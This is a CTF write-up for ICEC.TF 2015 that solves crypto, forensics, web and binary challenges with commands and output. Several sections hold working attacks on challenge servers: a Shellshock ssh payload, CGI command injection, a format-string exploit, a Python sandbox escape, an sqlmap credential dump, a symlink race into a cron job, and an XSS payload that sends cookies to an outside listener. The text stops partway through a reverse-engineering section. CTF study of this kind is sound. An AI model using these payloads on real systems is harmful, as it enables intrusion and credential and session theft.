---
layout: post
title: "ICEC.TF writeup"
categories: writeup ctf 
---
* TOC
{:toc}

# ROT13

```
$ python
Python 2.7.6 (default, Sep  9 2014, 15:04:36)

>>> import codecs
>>> codecs.encode('V srry yvxr guvf vf n tbbq cynpr gb fgber nyy zl frpher syntf. Vasnpg, urer\'f gur synt: ebg_13_vfag_frpher', 'rot13')
"I feel like this is a good place to store all my secure flags. Infact, here's the flag: rot_13_isnt_secure"
```

# Cryptic Crypto
For substitution cipher: http://quipqiup.com/index.php 

# Statistics

```python
#!/usr/bin/env python

from pwn import *
from numpy import mean
import re

def process(command, nums):
    try:
        converted = map(int, re.split(r'\s+', nums.rstrip()))
    except:
        pass

    if 'maximum' in command:
        return str(max(converted))
    if 'minimum' in command:
        return str(min(converted))
    if 'sum' in command:
        return str(sum(converted))
    if 'average' in command:
        return str(mean(converted))

r = remote('vuln2015.icec.tf', 9000)
t = Timeout()
t.timeout = 0.05

while True:
    nums = r.recvline()
    print nums
    sleep(0.05)
    command = r.recv()
    sleep(0.05)
    print command
    answer = process(command, nums)
    r.sendline(answer)
```

# Ryan Gooseling
```
binwalk + scalpel (uncommenting jpg)
```

# SHARKNADO!
```
root@kali32:~# tcpick -C -yU -r  sharknado.pcap  | grep -i admin
username=admin&password=IAmALittlePasswordShortAndStout
```

# Farm Animals
https://en.wikipedia.org/wiki/Pigpen_cipher

# RSA

```python
N = 0xc8283502d6ed4c723078d5ddd299c67deaef48ca2d8cdce64f99fe50ee5705705ab25c220ba6a1521c068016aab51f5139962bf8362f8b5ea157fc3ecefebe6dec216ba655c3f2b1538907182760ffde203bbed8e0a41bc833e94369e631b7a559f71e7ed773f029b82f46fbb0842f898048e45e15330b6671a8dbda59b025eb
e = 65537
p = 0xf51d59442bd9c0e3d7e51e54ae8c46a3e1bce33a1b38b4fbea26803de37475b0d1702431966d058327a629ce3af3321b06e6be4a9c9671e02f488405c9e91c71
q = 0xd10bbefe61fe293d45a0bd3266429c461977237838677bee06fe3ed051eb0b36828e627126239121913d4324029fb601b456c33863c9fa7bfa0ce85ff427861b
d = 0xd490debb8545be4a06f04d30a6d868d4910c4e6168be905a876f23870f979b4f17031495938a0309107a56cdbbbd5ee5042357cee2bcdb6644330cd02744a336779ca1f2f5fed59951c34c216577870841cb50e6a01be8f2e23591db4e8df1551d4245049c0996a887f82636a2bb5aff48c42ed83be4f2c218cd83307395941
c = 0x1dca210d36fb700e0fe41e951216b89c4cf10a4d4feeeac92722184a8d1e1306da36002bef27e9f0ec3b3256e821cfd0f7220930ac3d71a9fb981e9ad5ef3713b57ec78bfd4a96d53c7b0ad9e3698deef5ba10486da5936b60768c7275bb57ee67bc832ad954ee0c38124bc9518bf84d2fe76b16036d51071d307d6d23fe19ad

decrypted = Mod(c, N) ** d
# encrypt: c = pow(m, e, N)
# decrypt: m = pow(c, d, N)

flag = hex(Integer(decrypted)).decode('hex')
print(flag)
```

```
$ ./sage /tmp/rsa1.sage
flag_dont_you_just_love_rsa
```

# Shocked!
```
$ ssh -p 2022 ctf@vuln2015.icec.tf '() { :;}; cat flag.txt'
ctf@vuln2015.icec.tf's password:
The flag is: shocking_the_shellz_is_fun
```

# Hackers in disguise
I have found the solution for the almost same [challenge](http://ehsandev.com/pico2014/web_exploitation/make_a_face.html), more information 
abouth the vulnerability [here](http://www.cgisecurity.com/lib/sips.html).

```
root@kali32:~# vector=$(ruby -e 'print ";ls -la|".split(//).map{|x| "%" + x.ord.to_s(16)}.join')

root@kali32:~# curl "http://disguise.icec.tf/disguise.cgi?Hacker=${vector}&Mustache=3.bmp&Shades=3.bmp"
@MPAp)    xxx007 ECRT_KY_19DF8876272F766DE58C5EA5
rwx-xrx 2100 101  096Aug 6 2:4 cs
-rxr-r-x1 101 001  47 Ag   1249 isgisecgi-rwr----  101 101 514 Au  614:2 dsguse.tmldrwr-x-x  101 101 409 Au  612:9 fnt
rw---r- 1100 101 5738Aug 6 2:4 h1bmp-rwr----  101 101 473 Au  612:9 h.bm
-r-r-r--1 101 0015478 Ag   1249 3.bp
-wxrxr- 1 001100   44 ug 6 1:29indx.ci
-w-r-r- 1 001100  201 ug 6 1:13indx.hml
rwx-xrx 2100 101  096Aug 6 5:1 js-rwr----  101 101 473 Au  612:9 m.bm
-r-r-r--1 101 0015478 Ag   1249 2.bp
-w-r-r- 1 001100 5438 ug 6 1:49m3.mp
rw---r- 1100 101 5738Aug 6 2:4 s1bmp-rwr----  101 101 473 Au  612:9 s.bm
-r-r-r--1 101 0015478 Ag   1249 3.bp
-w-r-r- 1 001100 5438 ug 6 1:49s4.mp

root@kali32:~# curl "http://disguise.icec.tf/disguise.cgi?Hacker=${vector}&Mustache=${vector}&Shades=${vector}"
total 604
drwxr-xr-x 5 1001 1001  4096 Aug  6 23:21 .
drwxr-xr-x 6 1001 1001  4096 Aug  6 13:28 ..
-rw-r--r-- 1 1001 1001    38 Aug  6 14:07 SECRET_KEY_159DF48875627E2F7F66DAE584C5E3A5
drwxr-xr-x 2 1001 1001  4096 Aug  6 12:49 css
-rwxr-xr-x 1 1001 1001   437 Aug  6 12:49 disguise.cgi
-rw-r--r-- 1 1001 1001  5140 Aug  6 14:12 disguise.html
drwxr-xr-x 3 1001 1001  4096 Aug  6 12:49 font
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 h1.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 h2.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 h3.bmp
-rwxr-xr-x 1 1001 1001   144 Aug  6 13:29 index.cgi
-rw-r--r-- 1 1001 1001  2801 Aug  6 14:13 index.html
drwxr-xr-x 2 1001 1001  4096 Aug  6 15:16 js
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 m1.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 m2.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 m3.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 s1.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 s2.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 s3.bmp
-rw-r--r-- 1 1001 1001 54738 Aug  6 12:49 s4.bmp

root@kali32:~# vector=$(ruby -e 'print ";cat SECRET_KEY_159DF48875627E2F7F66DAE584C5E3A5|".split(//).map{|x| "%" + x.ord.to_s(16)}.join')
root@kali32:~# curl "http://disguise.icec.tf/disguise.cgi?Hacker=${vector}&Mustache=${vector}&Shades=${vector}"
flag_why_did_we_stop_using_perl_again
```


# Fermat
```
[ctf-7119@icectf-shell /home/fermat]$ ./fermat "$(python -c 'print "\x2c\xa0\x04\x08       %135$1326x%135$n"')"
, sh-4.2$ id
uid=1148(ctf-7119) gid=1021(fermat) groups=1002(ctf) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2$ cat flag.txt
flag_fermats_last_exploit
```

# Barista

Similarly like in [Hack.lu CTF 2014: Objection](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/objection), we overwroted the `getter` function for `is_admin`:

Vulnerable line:

```javascript
    # Check that the coffee exists
    if (coffee[name]? and
            name not in ["rebrew", "cleanup"] and
            typeof coffee[name] is "function")
```

```
http://coffee.icec.tf/__defineGetter__?args=is_admin
...
undefined + flag_i_dont_even_like_coffee_but_i_love_coffeescript
```

# PyShell

Similar as here: https://hexplo.it/escaping-the-csawctf-python-sandbox/

```
$ nc vuln2015.icec.tf 8000
Welcome to my Python sandbox! Enter commands below! Please don't mess up my server though :/
>>> [].__class__
>>> [].__class__.__base__
>>> print([].__class__.__base__.__subclasses__())
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
>>>
>>> print([].__class__.__base__.__subclasses__().index(file))
Traceback (most recent call last):
  File "./problem.py", line 37, in <module>
    exec data
  File "<string>", line 1, in <module>

$ nc vuln2015.icec.tf 8000
Welcome to my Python sandbox! Enter commands below! Please don't mess up my server though :/
>>> f = [].__class__.__base__.__subclasses__()[40]
>>> f('./flag.txt').read()
>>> print(f('./flag.txt').read())
The flag is: not_your_average_python
```

# Entropy

We have the python daemon, that uses only a few primes (they are stored in text file and keys are generated almost instantly). 

In the challenge information is provided public key `(N, e = 257)` and encrypted data `c`, that we want to decrypt:

```
27134539740327372277016096853435890120677470119612424124869327819124029912990004448750434621403418542927781194142877244503562989100969794546726189679434973051199593686324469650695332464843866317242833309989642047675838763945117051708685755516681732600344477784607819725824461400081264484810830802070160626494750360668977494105105567529042035493471083490134591723283745502956169145544321430921932449188900918387414900628355258180161727963712905333194811283381016749488185293777854150520335564364850062292655420041681761888247884838176822010929853437116012249823316297480912216876461230774949536318942112650569572741229

21833706562424363526758144595528139378681868374355612924041399984966569709971402846162543351650992393259625378308766376918010037809411868937951264540233547911616955412668210947953666054174014762004709853178682474885483298510115565509957726137783160293746001217719965940995344574478555209182195121905187551848171141764244076996783305517744086819333014890572868236912842045064036434736842358851218773925473983781900791489911542650152543840593725659311233554355918780080457663947286285012785980160999737442977651996204521503213470778632213967510707131516893141063362768682472114553632059355826524352103299651991899005722
```

After fetching a few public keys, using information from the [presentation](https://www.hyperelliptic.org/tanja/vortraege/facthacks-29C3.pdf) and [source](http://facthacks.cr.yp.to/fermat.html), we want to find the common primes.

```python
def product(X):
        if len(X) == 0: return 1
        while len(X) > 1:
                X = [prod(X[i*2:(i+1)*2]) for i in range((len(X)+1)/2)]
        return X[0]

def producttree(X):
        result = [X]
        while len(X) > 1:
                X = [prod(X[i*2:(i+1)*2]) for i in range((len(X)+1)/2)]
                result.append(X)
        return result

def remaindersusingproducttree(n,T):
        result = [n]
        for t in reversed(T):
                result = [result[floor(i/2)] % t[i] for i in range(len(t))]
        return result

def remainders(n,X):
        return remaindersusingproducttree(n,producttree(X))

def batchgcd_simple(X):
        R = remainders(product(X),[n^2 for n in X])
        return [gcd(r/n,n) for r,n in zip(R,X)]

def batchgcd_faster(X):
        prods = producttree(X)
        R = prods.pop()
        while prods:
                X = prods.pop()
                R = [R[floor(i/2)] % X[i]**2 for i in range(len(X))]
                return [gcd(r/n,n) for r,n in zip(R,X)]

# first line is our public key
print batchgcd_simple(
        [0xd6f26be4d627833b8eb7886d4234a99a391f2b14dfed53decda8a238043c8590ebd2561bebf508626fea71e1c5b912a3e6e1b1a1ad378ed778edd4c6d1269b51d263525b0850e95c5dc355846705f231c2a38744b6fea488df00cc23d9977cb6bfbde80b43314c09d3d65ffa48f566acce4bfc4c9f9d1acb4601af41f15957add7601d4828e2f30be1b2f98d4cba2f81e25738d5ba39e842372b301d1959ed8f704e457bc0f88882c8a3a9817a60d0b5960fe5f6ae17b1b2794ca51f0330c531fc5c19d8330341c7228cf794c0769fc91030f9b33855421ce3e78291d740754c91c2ecf591d0649875b1d6d18b03558b693d1742aadb41b1c949ba4fbbd8f06dL,
        0xd8b23baf97e9cf1faa4c6918b84e51b53e5ce25d93a39cbc4ac033bfb2a91110ee8ea872f3151f936f4b42c0b16065dc39d813a53914c5fccf86c3385e215fea90c7d2df09f62527b3a723baf0ef2937056cd8b02cd519b6da339a9d4744a6b5112aa5b49238bd52c56300dca61cfe3bc6401e2b6cbbce73dfab863ce847180c9a57a5ea80c40b0d164ba99ce96409b816b01574ecf938d3f2fe9f164ad6182c7e46a85127dd1faa7e35588fabfd155cf432514d6a3a5fc59ab55dd9a6923572f6de43745254ce8829f2c3f23198b364502d6173efc7fa714c39551e5551a2e79624f26da82e4a41ab2ea1607098f93ed62743e392d23694ae16ba5fec8aacf5, \
        0xe5ea8b1bcf376af0c1917be870fa147eab872224c21c9cfe87498ee7fd311c72fca829cf10b418e1ff3820237796010131e39982a79f947c4dfd923b2c999acaa39525e712b92b10563a558103bd9836d811cb7c163705ce87b0c05d3805479868626f2d1723d85a52fb06de7c9a073e697fd05137fa0ed135fba7bd35bc5d12b2415ffbd7505966dd05d1e39202275be3125fe5a5cdb192e9d616ea2009df88b632360aeb8a9a460b5dbbc4e189857d39aace108e6bd1e77f2113523544a35db6b71ba6506f585d7deed09218f7f11ec75007bbbfcafc0ac0853aeae5eb1db2e092eba82827ff38760983cf6d5e20531222a3e8826b8f751f50fb78e34437bd, \
        0xc439ed4afac3a78066a3a52202541480b3a400b4fb5710d0032cb23cf5570ef858735d5b6e41393f3abadee2241614a666da9ff98585f32deb82e64adf94da4627f515d7e2001b78157473266bada53f069d8930761a9b56b74153f43607b38f75642a3cdcdd8c299bae8275acbf8041edab88153a7c917b80b57d722882afe3988d93f9e479352a0c87fa04f49175446f4360ed011a99172c4038629f5030a2f6a2801fe338ee323fd760dfda8a4b245126c8ce62c1dc2bc1a47ba14d95f99d34ae566c5b1779134429c083913405040a58593cfb08b4f5a19f6e4c471a1a272321423784e8fe7611a18a0369b14dbd532195e1e81e74c739fb5eb291197b21,
        0x9d53d7b6c1a3ef1a62a33100de2e96ae8d80642b35cb525f4b7a1d0f7336037bb2c1cc73cbfe4dbc4fe7aa61c9afc78b8f5f78d2a851a47a029b2c74117c2022c875093a8243f500ed5c096f90022b6030e0a1ecbef352504e0b447df09eeebb8c26676b8c4615b8f05b96c884fce4e9e8149e520e65bce6e5e0f8a60c2fa436003cc53fd768ae8b67c1b753569b7c8888aff4a365c027dab77c699d687aea9e606b82238e760f409b2bae7f857c6d52b61e11e964f4cf2de08841c3e13cfa68dc3fd9e60cd020cc078517acd95c51cdc39fdeca354a051cdac8e9e81917808de76830e60d6be18f014221ba5b61e701ea7e8f3240c2182f14bbd89afe94f2dd,
        0xd5b9121c986c03839a6f8f5633e8be53539c7c4b4ea227353dd347b1846d4210300a0646ec6644b3e0926c0e12b9db551685fea310dfd124778893f3a919a3e9a6957e797e8d417c749d295817f99f76ea7e3ac829ac7497fb66673f5e5de453354f2b252769ea71305b6332ba502538ca6ef9023166da519f826a61978f89cadaa3c7b3aba8acc430d7918ea84158eff4c04bdd6a09bf1f358c6e42d101e6cdb205a70ad38f546b7efec13c4b1d7c28c89934ab4ee139117a2c804ac16ad79c435e290da270fb9e2b66e1b7a28f3ff18e0295138946291f81c9088aec97c2991ddd1a641b98685e8e4aecf8d3a41c766f674d8fb44d0fc4fb0770be3c4f7bd1,
        0x99f5b356fe0ee4d5f2547c07e7d37eaf451ff54663a4623527ffe9cced2924bc3da53384dd609fd4c80cb76893ef1ffc7b45c1226449e665236d9e9c83ca7adea9c4b0331217af4c17ec4152b288a83dbc4b9c60f22d7a2f49f901c5e09f99fa834923505954ef9fc48b11a97a58a0fce38f9d980a017b5aa005d81c85be0fea138476540812a602dc5e5ca4dd7ef411a185dad805f43ae3431b627c88b8f1d8e59c363a70c17c3b1ea9e25a25a1b8e935b1c7c5356103a309db094b5454f281f2cce84a0e981a5ea2e5e34e7eac3fcaeb5eec48c5583bf35ef1e98967111472b8055847c5cc498d3807cb97ae0234e25dc016e47ae9b765b9d0db9998882cb9,
        0xe02e1fb7464295424b8781f2cd600ddbbd57c785a45c9ca29350a3016afd5f7976f5bd475b101cd1072e21dd5c864a9f9419a2a0ac3b68f4f0649d28771597ae5eb906600636f4cc9ca0357bb7be85bc9593ad5814a4ed2964367ad9a9f90974b6172973f6c27d6d7e9b14f880ca12eb25ecab5d60bc4b0b2e4bbfa3ad6214b8b1d0fa250dc8e20d433b20a8d9e90cb3532e50f2ef0c8a693e9e9443d3cd4b83308144c5bd448865649e74ae37e5fcefaf0ee57096959a6fa4fcbe65f4bec364a7defb5329a8da93977fa121c51b13a3772e79b8dba393a4156611fcd1795e2fceb3d0e6b5facb7b7341b2da63caa167307060797b274e8812499fb9c8160375
])
```

```
$ ./sage /tmp/entropy.sage
[174530909087014716115113368365080232735669872304657503181040399565409510763517957093840008899869814249462343244523157586287119841547254547568826577936318168641266138819124651861211744771083886615905360155208773780746504047920299202268833418863547500887620241823421979548067336758574000690763023308648146612727, 174530909087014716115113368365080232735669872304657503181040399565409510763517957093840008899869814249462343244523157586287119841547254547568826577936318168641266138819124651861211744771083886615905360155208773780746504047920299202268833418863547500887620241823421979548067336758574000690763023308648146612727, 170316696567110693907901665907921187512526625561793633660441726765261555099366043994312802446177850632556845607014968778372160037033301431637986429627378357802441334583859591255752767815253729641791129186620238677327493472217907151892848591863869105693075425376910389368764492968308424836810176627203201410299, 170316696567110693907901665907921187512526625561793633660441726765261555099366043994312802446177850632556845607014968778372160037033301431637986429627378357802441334583859591255752767815253729641791129186620238677327493472217907151892848591863869105693075425376910389368764492968308424836810176627203201410299, 1, 1, 1, 1]
```

Because the `174530909087014...` value is divisible by our public key, we were able to factor it and we got `q = N / p`.

```python
N = 27134539740327372277016096853435890120677470119612424124869327819124029912990004448750434621403418542927781194142877244503562989100969794546726189679434973051199593686324469650695332464843866317242833309989642047675838763945117051708685755516681732600344477784607819725824461400081264484810830802070160626494750360668977494105105567529042035493471083490134591723283745502956169145544321430921932449188900918387414900628355258180161727963712905333194811283381016749488185293777854150520335564364850062292655420041681761888247884838176822010929853437116012249823316297480912216876461230774949536318942112650569572741229
c = 21833706562424363526758144595528139378681868374355612924041399984966569709971402846162543351650992393259625378308766376918010037809411868937951264540233547911616955412668210947953666054174014762004709853178682474885483298510115565509957726137783160293746001217719965940995344574478555209182195121905187551848171141764244076996783305517744086819333014890572868236912842045064036434736842358851218773925473983781900791489911542650152543840593725659311233554355918780080457663947286285012785980160999737442977651996204521503213470778632213967510707131516893141063362768682472114553632059355826524352103299651991899005722
p = 174530909087014716115113368365080232735669872304657503181040399565409510763517957093840008899869814249462343244523157586287119841547254547568826577936318168641266138819124651861211744771083886615905360155208773780746504047920299202268833418863547500887620241823421979548067336758574000690763023308648146612727
q = N / p
e = 257

phi = (p - 1) * (q - 1)
bezout = xgcd(e, phi);
d = Integer(mod(bezout[1], phi))
# mod(d * e, phi) == 1

decrypted = Mod(c, N) ** d

flag = hex(Integer(decrypted)).decode('hex')
print(flag)
```

```
./sage /tmp/solution.sage
flag_keep_the_prime_count_high
```

# Authorize
Time-delay injection in register field, using POST method:

```php
<?php
include "config.php";
$con = mysqli_connect($MYSQL_HOST, "authorize", "authorize", "authorize");
$username = $_POST["register"];
$query = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) !== 0) {
  die("Someone has already registered " . htmlspecialchars($username));
}

die("Registration has been disabled.");
?>

```

To solve it quickly, we used sqlmap:

```
# sqlmap  -u "http://web2015.icec.tf/authorize/" --forms -D authorize -T users --dump

...
Database: authorize
Table: users
[1 entry]
+----+----------+-----------------------------+
| id | username | password                    |
+----+----------+-----------------------------+
| 1  | admin    | TogetherW3CanChangeTheWr0ld |
+----+----------+-----------------------------+
```

```
Logged in!

Your flag is: flag_binary_search_those_credentials
```

# Elevate

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

int read_password(FILE *file, char *password, size_t n) {
    fgets(password, n, file);
    password[strcspn(password, "\n")] = '\0';
}

void elevated_shell(){
    gid_t gid = getegid();
    setresgid(gid,gid,gid);
    fflush(stdout);
    system("/bin/bash");
}

void regular_shell(){
    gid_t gid = getgid();
    setresgid(gid,gid,gid);
    fflush(stdout);
    system("/bin/bash");
}

int main(int argc, char **argv){

    char flag[100];
    char password[100];
    FILE *file;

    printf("Hi! Welcome to my secure shell software!\n");

    // Read in the root password
    file = fopen("flag.txt", "r");
    if(file == NULL) {
        printf("FAIL: Failed to open the password file\n");
        return -3;
    } else {
        read_password(file, flag, sizeof(flag));
    }

    // Read in the user's password
    printf("Please enter the password: ");
    fflush(stdout);
    read_password(stdin, password, sizeof(password));


    if(strcmp(flag,password) == 0) {
        printf("Correct! Here's an elevated shell :)\n");
        elevated_shell();
    } else {
        printf("Incorrect! No elevated shell for you >:)\n");
        regular_shell();
    }
}
```

Obviously, the `flag.txt` file is read, but from current working directory.

Solution:

```
[ctf-7119@icectf-shell /home/elevate]$ cd /tmp
[ctf-7119@icectf-shell /tmp]$ mkdir .sine
[ctf-7119@icectf-shell /tmp]$ cd .sine
[ctf-7119@icectf-shell .sine]$ echo 1337 > flag.txt

[ctf-7119@icectf-shell .sine]$ /home/elevate/elevate
Hi! Welcome to my secure shell software!
Please enter the password: 1337
Correct! Here's an elevated shell :)

[ctf-7119@icectf-shell .sine]$ cat /home/elevate/flag.txt
flag_c21f22c6ff839828124be4f38677f7cf
```

# Supernote
Exploitable code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pwd.h>
#include <curl/curl.h>

char *gethome() {
    return getpwuid(getuid())->pw_dir;
}

char *get_temp(){
    char *fname = tempnam(gethome(), "ctf1_");
    struct stat buf;
    if(stat(fname, &buf) >= 0) {
        fprintf(stderr, "Temporary file exists!\n");
        exit(1);
    }
    fprintf(stderr, "Temporary file is %s\n", fname);
    return fname;

}
void upload_note(char *email, char *name, char *msg) {
    CURL *curl;
    CURLcode res;
    char buf[1024];
    snprintf(buf, sizeof(buf), "email=%s&name=%s&msg=%s", email, name, msg);

    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://web2015.icec.tf/supernote/index.php");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            exit(1);
        }

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}
void write_note(char *fname, char *str) {
    FILE *fd = fopen(fname, "w");
    fputs(str, fd);
    fclose(fd);

    // Test version, keep things clean
    unlink(fname);
}
int main(int argc, char **argv){
    char email[80];
    char name[80];
    char contents[500]; // That's a bit much, don't you think?
    char *ptr;
    char *tmpfile = get_temp();
    printf("Welcome to SuperNote v1.1.1.1.1.1.1.1.1.1. We're still in beta, so please excuse some bugs.\n");
    printf("Please enter your email address: ");
    fgets(email, sizeof(email), stdin);
    email[sizeof(email)-1] = '\0';
    email[strlen(email)-1] = '\0';
    printf("Please enter your name: ");
    fgets(name, sizeof(name), stdin);
    name[sizeof(name)-1] = '\0';
    name[strlen(email)-1] = '\0';
    printf("Enter the note that you would like to save: ");
    fgets(contents, sizeof(contents), stdin);

    // Validate the email securely
    int i=0;
    ptr = strtok(email, "@");
    while(ptr != NULL) {
        i++;
        ptr = strtok(NULL, "@");
    }
    if(i != 2){
        fprintf(stderr, "Invalid email!\n");
        exit(1337); // huehue
    }
    if(strcmp(name,"Josh\n") == 0) {
        fprintf(stderr, "Go away Josh\n");
        exit(1);
    }

    upload_note(email, name, contents);

    write_note(tmpfile, contents);

    printf("Note saved locally.\n");
    return 0;
}
```

There is a race condition, we can create a symlink pointing to arbitrary file,
then our data is stored here, finally the symlink is removed. The `cron.README`
hints us to use python script for executing `.task(s)`. Moreover cron needs
permission for writing to our directory.
```
[ctf-7119@icectf-shell /tmp]$ mkdir .sine
[ctf-7119@icectf-shell /tmp]$ chmod 777 .sine

[ctf-7119@icectf-shell /tmp]$ /home/supernote/supernote
Temporary file is /home_users/ctf-7119/ctf1_yc9KGB
Welcome to SuperNote v1.1.1.1.1.1.1.1.1.1. We're still in beta, so please excuse some bugs.
Please enter your email address: a@test.com
Please enter your name: ^Z
[1]  + 19597 suspended  /home/supernote/supernote

[ctf-7119@icectf-shell /tmp]$ ln -s /home/supernote/cron.d/1337.task /home_users/ctf-7119/ctf1_yc9KGB

[ctf-7119@icectf-shell /tmp]$ fg
[1]  + 19597 continued  /home/supernote/supernote
name
Enter the note that you would like to save: import shutil; import os; d='/tmp/.sine/flag.txt'; shutil.copy('/home/supernote/flag.txt', d); os.chmod(d, 0777);
Note saved.
Note saved locally.

[ctf-7119@icectf-shell /tmp]$ date
Sun Aug 16 11:38:45 UTC 2015

[ctf-7119@icectf-shell /tmp]$ date
Sun Aug 16 11:39:13 UTC 2015

[ctf-7119@icectf-shell /tmp]$ cd .sine

[ctf-7119@icectf-shell /t/.sine]$ ls
flag.txt

[ctf-7119@icectf-shell /t/.sine]$ cat flag.txt
flag_keep_your_files_close_and_your_tempfiles_closer
```

Because I was interested also what exactly is executing via `cron`, using the same technique, I did:

```
Enter the note that you would like to save: from os import system; system('cp -r /usr/local/etc/supernote/* /tmp/.sine/; chmod 777 -R /tmp/.sine');
Note saved.
Note saved locally.

[ctf-7119@icectf-shell /t/.sine]$ date
Sun Aug 16 11:48:59 UTC 2015

[ctf-7119@icectf-shell /t/.sine]$ cat supernote.sh
#!/bin/bash

for file in /home/supernote/cron.d/*.task; do
    /usr/bin/python $file
    rm -f $file
done

rm -rf /home/supernote/cron.d/*
rm -rf /home/supernote/cron.d/.* 2> /dev/null
```

# Wiki & The Furious
DOM Based XSS challenge. The vulnerable code:

```javascript
var showComment = function(){
    var hash = decodeURIComponent(location.hash); // Comment ID's can be pretty wierd
    var $comment = $(hash);        
    if($comment.length < 1) 
        return;
    $("html,body").animate({
        scrollTop: $comment.offset().top
    }, 2000);
    $(".comment").css("background-color", "");
    $comment.css("background-color", "#eee");

}
$(document).ready(function(){
    $(window).bind("hashchange",showComment);
    showComment();
});
```

The injected javascript code could be evaluated here:

```javascript
    var hash = decodeURIComponent(location.hash); // Comment ID's can be pretty wierd
    var $comment = $(hash);
```

Test URL:
```
http://furious-wiki.icec.tf/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title#<img src="/" onerror="alert(String.fromCharCode(39,88,83,83,39));">
```

We need to deliver the payload to admin:
```
POST /report HTTP/1.1
Host: furious-wiki.icec.tf
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://furious-wiki.icec.tf/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title
Cookie: PHPSESSID=s%3Ag26_c-cLthzShO_xncYWAI0qp-OtiZm4.jY5w%2F4cH7K%2B18sNhcK22aAb5%2FueHPymlOOdtyKkdhp4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 133

user=o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur&post=title&comment=title#<img+src=x+onerror=this.src='http://xxxxxxx:3337/?'%2Bdocument.cookie>
```

```
$ nc -l -p 3337
GET /?PHPSESSID=s%3A7ZeQMpUDARFuj_7Bmu2izwxQQnE7kmsz.sQblDjvm9VN7aEYtrmpYoB8N7HeAfajhPwFMI1LkrjM HTTP/1.1
Referer: http://localhost:3000/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: xxxxxxx:3337
```

After setting cookie to the value `s:NO7VjJneMo5ArzEcrwTUXMIR2W9A05RU.Xg8/oyINQGJh09tP234WRlXFaE3NsBEeOHFRyN2FmCo`,
we was able to read the flag: `flag_so_simple_yet_so_hard `.


# What
Simple RE challenge. There is a binary without source code, performing a
several checks:

```
# Number of command line arguments should be 2
=> 0x80486b2:	cmp    DWORD PTR [ebp+0x8],0x3 

# First argument should be 'ausgeschnitzel'
=> 0x80486c5:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x80486c7:	seta   dl
   0x80486ca:	setb   al
   0x80486cd:	cmp    dl,al

# Second argument should be 'flugelfragen'
   0x80486de:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x80486e0:	seta   dl
   0x80486e3:	setb   al
=> 0x80486e6:	cmp    dl,al

gdb-peda$ set args ausgeschnitzel flugelfragen

# There is another check for env variable 'AUTH':
gdb-peda$ set environment AUTH = foo

